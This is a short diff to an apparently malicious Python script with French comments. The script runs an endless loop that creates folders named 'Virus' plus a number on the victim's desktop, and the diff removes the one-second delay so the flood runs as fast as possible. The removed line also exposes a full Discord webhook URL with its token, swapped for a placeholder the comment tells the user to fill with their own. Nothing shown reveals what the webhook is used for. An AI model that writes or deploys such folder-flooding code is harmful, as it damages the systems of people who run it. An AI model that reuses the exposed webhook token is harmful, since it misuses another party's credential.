@@ -34,7 +34,7 @@ print(f""" {yellow}
 """)
 os.system("cls")
 
-webhook = "https://discord.com/api/webhooks/1511836778913333480/1-HT0wk_0WB83PGWUu8qaw7v4VLopFtuxd9ZJwsph5Ig4CowS2bqoydArgLyr5CybckmU_Webhook" # Ici faut placer ton webhook
+webhook = "U_webhook" # Ici faut placer ton webhook
 
 def dossier():
     while True:
@@ -44,7 +44,6 @@ def dossier():
             new_dossier = os.path.join(bureau, f"Virus{ajout}")
 
             os.mkdir(new_dossier)
-            time.sleep(1)
         except Exception as e:
             print("Error", e)
 
